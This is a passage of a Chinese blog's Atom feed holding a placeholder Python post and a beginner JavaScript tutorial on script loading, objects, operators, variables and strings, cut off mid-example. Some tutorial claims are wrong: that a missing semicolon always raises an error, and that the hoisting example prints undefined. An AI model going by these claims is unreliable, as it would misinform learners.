    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="Web-SQL" scheme="https://we11s.github.io/tags/Web-SQL/"/>
    
  </entry>
  
  <entry>
    <title>初探Python</title>
    <link href="https://we11s.github.io/posts/831263057/"/>
    <id>https://we11s.github.io/posts/831263057/</id>
    <published>2024-02-01T14:03:58.000Z</published>
    <updated>2024-03-12T16:31:24.044Z</updated>
    
    <content type="html"><![CDATA[<h1 id="施工中"><a href="#施工中" class="headerlink" title="施工中"></a>施工中</h1><p><img src="/img/edit.png" alt="施工中"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;施工中&quot;&gt;&lt;a href=&quot;#施工中&quot; class=&quot;headerlink&quot; title=&quot;施工中&quot;&gt;&lt;/a&gt;施工中&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/img/edit.png&quot; alt=&quot;施工中&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="编程" scheme="https://we11s.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript初探索</title>
    <link href="https://we11s.github.io/posts/4105956505/"/>
    <id>https://we11s.github.io/posts/4105956505/</id>
    <published>2024-01-27T11:42:29.000Z</published>
    <updated>2024-03-12T16:32:00.853Z</updated>
    
    <content type="html"><![CDATA[<p>JavaScript 是一种可插入 HTML 页面的轻量级的编程语言。</p><h1 id="初识JavaScript"><a href="#初识JavaScript" class="headerlink" title="初识JavaScript"></a><strong>初识JavaScript</strong></h1><h2 id="JavaScript的功能"><a href="#JavaScript的功能" class="headerlink" title="JavaScript的功能"></a>JavaScript的功能</h2><ol><li>直接写入 HTML 输出流</li><li>对事件的反应</li><li>改变 HTML 内容</li><li>改变 HTML 图像</li><li>改变 HTML 样式</li><li>验证输入</li></ol><h2 id="JavaScript-用法"><a href="#JavaScript-用法" class="headerlink" title="JavaScript 用法"></a>JavaScript 用法</h2><h3 id="内部的-JavaScript"><a href="#内部的-JavaScript" class="headerlink" title="内部的 JavaScript"></a>内部的 JavaScript</h3><p>HTML 中的 Javascript 脚本<strong>代码</strong>必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code>标签之间，<strong>加上标签后的代码代码</strong>可被放置在 HTML 页面的 <code>&lt;body&gt;</code> 和 <code>&lt;head&gt;</code> 部分中。</p><h3 id="外部的-JavaScript"><a href="#外部的-JavaScript" class="headerlink" title="外部的 JavaScript"></a>外部的 JavaScript</h3><p>外部 JavaScript 文件的文件扩展名是 .js。使用以下代码，可将代码引入外部的 JavaScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;the_url_of_your_.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>​由于混合 JavaScript 和 HTML 会使代码难以维护和理解，所以与CSS一样，将<strong>js代码文件与html文件分离</strong></p><h2 id="JavaScript-运行次序"><a href="#JavaScript-运行次序" class="headerlink" title="JavaScript 运行次序"></a>JavaScript 运行次序</h2><p>当浏览器执行到一段 JavaScript 代码时，通常会按从上往下的顺序执行这段代码。如果 JavaScript 先于要修改的 HTML 和 CSS 加载和运行，则可能发生错误。在引用对象之前必须确保该对象已经存在，对象还不存在，就不能为它增添一个事件监听器。</p><h2 id="脚本调用设置"><a href="#脚本调用设置" class="headerlink" title="脚本调用设置"></a>脚本调用设置</h2><p><strong>异步加载</strong>：指在 HTML 文档解析过程中，同时下载其他资源的过程。</p><h3 id="默认情况"><a href="#默认情况" class="headerlink" title="默认情况"></a>默认情况</h3><p>浏览器会立即下载并执行脚本。这意味着脚本会阻塞 HTML 文档的解析和渲染过程，直到脚本执行完毕。如果脚本文件很大或加载时间较长，这可能会导致页面加载速度变慢。</p><h3 id="异步下载立即执行-限外部JS"><a href="#异步下载立即执行-限外部JS" class="headerlink" title="异步下载立即执行(限外部JS)"></a>异步下载立即执行(限外部JS)</h3><p>带有 <code>async</code> 属性的脚本，浏览器会异步下载脚本文件，并且不会阻塞 HTML 文档的解析和渲染。一旦脚本文件下载完成，浏览器会立即执行它，而不会等待其他资源的加载完成。</p><p><strong><code>async</code> 属性的脚本将在下载完成后立即执行。这将阻塞页面，并不保证任何特定的执行顺序。</strong></p><h3 id="异步下载等待页面渲染后顺序执行"><a href="#异步下载等待页面渲染后顺序执行" class="headerlink" title="异步下载等待页面渲染后顺序执行"></a>异步下载等待页面渲染后顺序执行</h3><h4 id="内部的-JavaScript-1"><a href="#内部的-JavaScript-1" class="headerlink" title="内部的 JavaScript"></a>内部的 JavaScript</h4><p>可以使用以下结构：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;DOMContentLoaded&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 在这里编写你的 JavaScript 代码</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="外部的-JavaScript-1"><a href="#外部的-JavaScript-1" class="headerlink" title="外部的 JavaScript"></a>外部的 JavaScript</h4><p>可以使用了<code>defer</code>标签：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;the_url_of_your_.js&quot;</span> defer&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>带有 <code>defer</code> 属性的脚本将按照它们的顺序加载，并且只有在所有脚本加载完毕后才会执行。</strong></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结：</strong></h3><ul><li>如果脚本无需依赖html解析渲染出的对象，且无依赖其他资源独立运行，那么应使用 <code>async</code>。</li><li>如果脚本需要依赖html解析渲染出的对象，或依赖于其他脚本，调用这些脚本时应使用 <code>defer</code>，将关联的脚本按所需顺序置于 HTML 的相应 <code>&lt;script&gt;</code> 元素中。</li></ul><p>一些我奇怪的想法</p><ul><li>如果脚本需要依赖html解析渲染出的对象，但不依赖于其他脚本，使用<code>defer</code>属性</li><li>如果脚本无需要依赖html解析渲染出的对象，且依赖于其他脚本，使用<code>defer</code>属性或者将两个js写在一块，用<code>async</code>属性</li></ul><p>总之一般情况下都用<code>defer</code>，比较万金油，默认模式一般都不推荐使用</p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a><strong>基础概念</strong></h1><h2 id="函数（Function）"><a href="#函数（Function）" class="headerlink" title="函数（Function）"></a>函数（Function）</h2><p>函数是可复用的代码块，可以一次编写，反复运行，从而节省了大量的重复代码。</p><p>函数的格式包括了关键字 <code>function</code> 、一个函数名、一对小括号定义了一个函数。随后是一对花括号（<code>&#123; &#125;</code>）。花括号内部是调用函数时要运行的所有代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">the_name_of_function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  your code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件（Event）"><a href="#事件（Event）" class="headerlink" title="事件（Event）"></a>事件（Event）</h2><p>理想中，我们希望在点击某个按钮时调用某个函数，为此，我们需要使用事件。<strong>事件就是浏览器中发生的事儿</strong>，比如点击按钮、加载页面、播放视频，等等，我们可以通过调用代码来响应事件。侦听事件发生的结构称为<strong>事件监听器</strong>（Event Listener），响应事件触发而运行的代码块被称为<strong>事件处理器</strong>（Event Handler）。</p><h2 id="对象（Object）"><a href="#对象（Object）" class="headerlink" title="对象（Object）"></a>对象（Object）</h2><p>在JavaScript中，一切都是对象。对象是一种复合数据类型(类似C语言的结构体)，它可以包含<strong>属性和方法，由逗号分隔开</strong>。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个对象</span></span><br><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">  <span class="comment">// 属性</span></span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">30</span>,</span><br><span class="line">  <span class="comment">// 方法</span></span><br><span class="line">  <span class="attr">greet</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, my name is &quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>点符号（<code>.</code>）来访问对象的属性和其他方法，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.greet(); // 调用对象的方法</span><br></pre></td></tr></table></figure><p>属性是对象的特征或数据是任何JavaScript数据类型，包括字符串、数字、布尔值、数组、甚至其他对象。</p><h2 id="方法（method）"><a href="#方法（method）" class="headerlink" title="方法（method）"></a>方法（method）</h2><p>与对象关联的<strong>函数</strong>。方法是在对象上定义的，它可以访问对象的属性和其他方法，并执行特定的操作。是对象能够执行的操作或行为。可通过浏览器的JavaScript 控制台操作浏览器对象</p><h3 id="函数与方法的差别"><a href="#函数与方法的差别" class="headerlink" title="函数与方法的差别"></a>函数与方法的差别</h3><ol><li><p>归属关系：<strong>方法是与对象关联的函数</strong>。它们通常是在对象的上下文中定义的，并且可以访问对象的属性和其他方法。方法是对象的行为或操作。<strong>函数是独立的代码块</strong>，不依赖于特定的对象。它们可以在任何地方定义和调用，而不需要依赖于对象。</p></li><li><p>调用方式：<strong>方法通过对象来调用。它们使用对象名和方法名的结合形式进行调用</strong>，例如 <code>objectName.methodName()</code>。方法的调用是基于对象的，因此方法可以使用对象的属性和其他方法。<strong>函数可以直接通过函数名进行调用</strong>，例如 <code>functionName()</code>。函数的调用是独立的，不依赖于特定的对象。</p></li><li><p>参数传递：<strong>方法通常将对象本身作为第一个参数传递给方法（通常称为 <code>this</code> 或 <code>self</code>）</strong>，以便在方法内部访问对象的属性和其他方法。方法可以接受其他参数作为输入。函数可以接受任意数量的参数，并且可以通过参数来接收外部值。</p><p>例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;Wells&quot;</span>,</span><br><span class="line">  <span class="attr">greet</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, my name is &quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>); <span class="comment">//使用this作为对象本身</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">greet</span>(); <span class="comment">// 输出 &quot;Hello, my name is Wells&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>定义方式：方法是在对象或类的定义中声明的。它们可以使用对象字面量语法或类的方法定义语法进行定义。函数可以在全局范围内或其他函数内部进行定义。它们可以使用函数声明语法或函数表达式语法进行定义。</p></li></ol><h2 id="运算符（Operator）"><a href="#运算符（Operator）" class="headerlink" title="运算符（Operator）"></a>运算符（Operator）</h2><p>JavaScript 运算符允许我们执行比较、做数学运算、连接字符串等等。</p><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">+</td><td align="left">加法</td></tr><tr><td align="left">-</td><td align="left">减法</td></tr><tr><td align="left">*</td><td align="left">乘法</td></tr><tr><td align="left">**</td><td align="left">幂</td></tr><tr><td align="left">&#x2F;</td><td align="left">除法</td></tr><tr><td align="left">%</td><td align="left">取模（余数）</td></tr><tr><td align="left">++</td><td align="left">自增</td></tr><tr><td align="left">–</td><td align="left">自减</td></tr></tbody></table><ul><li><p>自增和自减运算符放置在变量前和变量后与区别（与C语言类似）</p><ol><li>前置自增&#x2F;自减运算符会先对变量进行自增或自减操作，然后返回更新后的值。</li><li>后置自增&#x2F;自减运算符会先返回变量的原始值，然后再对变量进行自增或自减操作。</li></ol></li><li><p>运算符用于把文本值或字符串变量加起来（连接起来）。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">txt1=<span class="string">&quot;What a very&quot;</span>;</span><br><span class="line">txt2=<span class="string">&quot;nice day&quot;</span>;</span><br><span class="line">txt3=txt1+txt2;</span><br></pre></td></tr></table></figure><p>则<code>txt3</code>为<code>What a verynice day</code></p></li><li><p>如果数字与字符串相加，此时数字会被认为是字符串，返回字符串</p><p>例如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z=<span class="string">&quot;Hello&quot;</span>+<span class="number">666</span>;</span><br></pre></td></tr></table></figure><p>则<code>z</code>为<code>Hello666</code></p></li></ul><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>赋值运算符用于给 JavaScript 变量赋值。</p><table><thead><tr><th align="left">运算符</th><th align="left">例子</th><th align="left">等同于</th></tr></thead><tbody><tr><td align="left">&#x3D;</td><td align="left">x&#x3D;y</td><td align="left">（将y赋值给x）</td></tr><tr><td align="left">+&#x3D;</td><td align="left">x+&#x3D;y</td><td align="left">x&#x3D;x+y</td></tr><tr><td align="left">-&#x3D;</td><td align="left">x-&#x3D;y</td><td align="left">x&#x3D;x-y</td></tr><tr><td align="left">*&#x3D;</td><td align="left">x*&#x3D;y</td><td align="left">x&#x3D;x*y</td></tr><tr><td align="left">&#x2F;&#x3D;</td><td align="left">x&#x2F;&#x3D;y</td><td align="left">x&#x3D;x&#x2F;y</td></tr><tr><td align="left">%&#x3D;</td><td align="left">x%&#x3D;y</td><td align="left">x&#x3D;x%y</td></tr></tbody></table><h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>比较运算符在逻辑语句中使用，以测定变量或值是否相等。</p><p>以x&#x3D;5为例：</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">比较</th><th align="left">返回值</th></tr></thead><tbody><tr><td align="left">&#x3D;&#x3D;</td><td align="left">等于(类型不等时会进行转化)</td><td align="left">x&#x3D;&#x3D;8</td><td align="left"><em>false</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;5</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;”5”</td><td align="left"><em>true</em></td></tr><tr><td align="left">&#x3D;&#x3D;&#x3D;</td><td align="left">严格等于（值和类型均相等）</td><td align="left">x&#x3D;&#x3D;&#x3D;”5”</td><td align="left"><em>false</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x&#x3D;&#x3D;&#x3D;5</td><td align="left"><em>true</em></td></tr><tr><td align="left">!&#x3D;</td><td align="left">不等于</td><td align="left">x!&#x3D;8</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x!&#x3D;”5”</td><td align="left"><em>false</em></td></tr><tr><td align="left">!&#x3D;&#x3D;</td><td align="left">严格不等于（值和类型有一个不相等，或两个都不相等）</td><td align="left">x!&#x3D;&#x3D;”5”</td><td align="left"><em>true</em></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">x!&#x3D;&#x3D;5</td><td align="left"><em>false</em></td></tr><tr><td align="left">&gt;</td><td align="left">大于</td><td align="left">x&gt;8</td><td align="left"><em>false</em></td></tr><tr><td align="left">&lt;</td><td align="left">小于</td><td align="left">x&lt;8</td><td align="left"><em>true</em></td></tr><tr><td align="left">&gt;&#x3D;</td><td align="left">大于或等于</td><td align="left">x&gt;&#x3D;8</td><td align="left"><em>false</em></td></tr><tr><td align="left">&lt;&#x3D;</td><td align="left">小于或等于</td><td align="left">x&lt;&#x3D;8</td><td align="left"><em>true</em></td></tr></tbody></table><p>严格的版本往往导致更少的错误，建议使用这些严格的版本。</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>逻辑运算符用于测定变量或值之间的逻辑。</p><table><thead><tr><th align="left">运算符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">&amp;&amp;</td><td align="left">and（同时成立为真）</td></tr><tr><td align="left">||</td><td align="left">or（一个成立为真）</td></tr><tr><td align="left">!</td><td align="left">not</td></tr></tbody></table><h3 id="条件（三元）运算符"><a href="#条件（三元）运算符" class="headerlink" title="条件（三元）运算符"></a>条件（三元）运算符</h3><p>条件元素运算符把两个结果中其中一个符合运算逻辑的值返回。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">? :</span><br><span class="line">(condition ? ifTrue : ifFalse)</span><br></pre></td></tr></table></figure><p>更多条件运算符参照：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators">表达式和运算符 - JavaScript | MDN (mozilla.org)</a></p><h1 id="JavaScript基础"><a href="#JavaScript基础" class="headerlink" title="JavaScript基础"></a><strong>JavaScript基础</strong></h1><p>JavaScript的语句都是<strong>以<code>;</code>作为结束</strong>，缺少<code>;</code>会导致报错</p><h2 id="注释语法"><a href="#注释语法" class="headerlink" title="注释语法"></a>注释语法</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><ul><li><p>在双斜杠（&#x2F;&#x2F;）后添加单行注释，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// 我是一条注释</span><br></pre></td></tr></table></figure></li></ul><h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><ul><li><p>在<code>/*</code>和<code>*/</code>之间添加多行注释，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  我也是</span><br><span class="line">  一条注释</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></li></ul><h2 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h2><p>声明一个变量，即创建一个变量。</p><p>声明一个变量的语法是在 <code>var</code> 或 <code>let</code> 关键字之后加上这个变量的名字，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Name2</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Name1</span>;</span><br></pre></td></tr></table></figure><h3 id="var-与-let-的区别"><a href="#var-与-let-的区别" class="headerlink" title="var 与 let 的区别"></a><strong>var 与 let 的区别</strong></h3><p>推荐在现代JavaScript中<strong>使用 <code>let</code> 来声明变量</strong></p><ol><li><p>作用域：<strong>使用 <code>var</code> 声明的变量具有函数作用域，而使用 <code>let</code> 声明的变量具有块级作用域。</strong>函数作用域意味着变量在声明它们的函数内部是可见的，而块级作用域意味着变量在声明它们的代码块（例如，<code>&#123;&#125;</code>包括起来的代码块：<code>if</code>语句、循环等）内部是可见的。</p></li><li><p>变量提升：使用 <code>var</code> 声明的变量会发生变量提升，意味着变量在其作用域内的任何位置都是可访问的，即使在变量声明之前也可以访问到。而使用 <code>let</code> 声明的变量不会发生变量提升，它们只能在声明之后才能被访问。</p><p>例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">myName = <span class="string">&quot;Chris&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">logName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(myName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">logName</span>();<span class="comment">//输出undefined</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> myName;</span><br></pre></td></tr></table></figure><div class="note danger simple"><p>感谢<a href="https://xzb666-hub.github.io/">@Eneed_gl</a>的指错，变量提升（指的是函数声明和变量声明（注意是声明，不包括初始化）会被提升到其所在作用域的最顶部）的时候是不会编译先前初始化的赋值语句的，故此时输出undefined</p></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(name); // 输出 undefined</span><br><span class="line">var name = &quot;John&quot;;</span><br><span class="line">console.log(name); // 输出 &quot;John&quot;</span><br></pre></td></tr></table></figure><p>​以上代码它仍然可以工作，若替换成let则就会报错</p></li><li><p>重复声明：<strong>使用 <code>var</code> 声明的变量可以被多次声明而不会引发错误，而使用 <code>let</code> 声明的变量在同一作用域内重复声明会引发错误</strong>。</p></li><li><p>全局对象属性：使用 <code>var</code> 声明的变量会成为全局对象（在浏览器中是 <code>window</code> 对象）的属性，而使用 <code>let</code> 声明的变量不会成为全局对象的属性。</p></li></ol><h2 id="变量命名的规则"><a href="#变量命名的规则" class="headerlink" title="变量命名的规则"></a>变量命名的规则</h2><p>使用拉丁字符 (0-9,a-z,A-Z) 和下划线字符。</p><ul><li>你不应当使用规则之外的其他字符，因为它们可能引发错误，或对国际用户来说难以理解。</li><li>变量名不要以下划线开头——以下划线开头的被某些 JavaScript 设计为特殊的含义，因此可能让人迷惑。</li><li>变量名不要以数字开头。这种行为是不被允许的，将会报错。</li><li>变量名大小写敏感——因此<code>myage</code>与<code>myAge</code>是 2 个不同的变量。</li><li>避免使用 JavaScript 的保留字给变量命名。保留字，即是组成 JavaScript 的实际语法的单词</li></ul><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p><strong>JavaScript 是一种“动态类型语言”，你不需要指定变量将包含什么数据类型</strong></p><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>​包括整数也包括浮点数，统称为数字，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myAge = <span class="number">17</span>;</span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>​当你给一个变量赋值为字符串时，你需要用单引号或者双引号把值给包起来，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> prise = <span class="string">&quot;You are smart&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h3><p>​布尔值有 2 种：true 或 false，用于进行判断</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> iAmAlive = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>​数组将任何类型的元素存储在数组中 - 字符串，数字，对象，另一个变量，甚至另一个数组。也可以混合不同类型元素，<strong>方括号括起来</strong>（区别于C语言），并用<strong>逗号分隔</strong>，最开始的序号为<strong>0</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myNameArray = [<span class="string">&quot;Chris&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Jim&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> myNumberArray = [<span class="number">10</span>, <span class="number">15</span>, <span class="number">40</span>];</span><br><span class="line"><span class="keyword">let</span> sequence = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>];</span><br><span class="line"><span class="keyword">let</span> random = [<span class="string">&quot;tree&quot;</span>, <span class="number">795</span>, [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]];</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myNameArray[<span class="number">0</span>]; <span class="comment">// 将得到：Chris</span></span><br><span class="line">myNumberArray[<span class="number">2</span>]; <span class="comment">// 将得到：40</span></span><br></pre></td></tr></table></figure><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>​见前文：<strong>基础概念·对象（Object）</strong>，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dog = &#123; <span class="attr">name</span>: <span class="string">&quot;Spot&quot;</span>, <span class="attr">breed</span>: <span class="string">&quot;Dalmatian&quot;</span> &#125;;</span><br></pre></td></tr></table></figure><p>与C语言调用结构体的成员类似，使用<code>.</code>用来表示对象中的某个信息，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dog.<span class="property">name</span>;</span><br></pre></td></tr></table></figure><h3 id="Undefined-和-Null"><a href="#Undefined-和-Null" class="headerlink" title="Undefined 和 Null"></a>Undefined 和 Null</h3><p>Undefined 这个值表示变量不含有值。</p><p>可以通过将变量的值设置为 null 来清空变量。</p><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>概念:使用 <code>const</code> 声明的变量称为“常量”</p><p>当某个变量永远不会改变的时候，就可以使用 <code>const</code> 来声明，而不是<code>let</code>。</p><p>注意:</p><ul><li><p>常量的命名规范和变量一致</p></li><li><p>常量不允许重新赋值,声明的时候必须赋值(初始化)</p></li><li><p>小技巧:可以利用<code>const</code>进行自定义函数，语法如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> functionName = <span class="keyword">function</span>(<span class="params">parameters</span>) &#123;</span><br><span class="line">  <span class="comment">// 函数体</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="字符串-1"><a href="#字符串-1" class="headerlink" title="字符串"></a>字符串</h2><h3 id="包裹字符串"><a href="#包裹字符串" class="headerlink" title="包裹字符串"></a>包裹字符串</h3><p>在 JavaScript 中，可以选择单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）或反引号（&#96;&#96;&#96;）来包裹字符串。字符串的开头和结尾必须使用相同的符号进行包裹</p><p>使用单引号声明的字符串和使用双引号声明的字符串是相同的</p><p>使用反引号声明的字符串是一种特殊字符串，被称为<strong>模板字面量</strong>。在大多数情况下，模板字面量与普通字符串类似，但它具有一些特殊的属性：</p><p>1.<strong>字符串插值</strong>（String interpolation）：您可以在模板字符串中使用 <code>$&#123;&#125;</code> 语法来<strong>插入变量或表达式的值</strong>。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Wells&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> message = <span class="string">`My name is <span class="subst">$&#123;name&#125;</span>.`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(message); <span class="comment">// 输出 &quot;My name is Wells.&quot;</span></span><br></pre></td></tr></table></figure><p>但对于单引号（<code>&#39;</code>）、双引号（<code>&quot;</code>）可使用可以使用 <code>+</code> 运算符来连接字符串。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> greeting = <span class="string">&quot;你好&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;Wells&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greeting + <span class="string">&quot;，&quot;</span> + name); <span class="comment">// &quot;你好，Wells&quot;</span></span><br></pre></td></tr></table></figure><p>2.多行字符串：模板字面量可以跨越多行，而<strong>无需使用特殊的转义字符或字符串连接操作符</strong>。例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> multiLine = <span class="string">`This is a</span></span><br><span class="line"><span 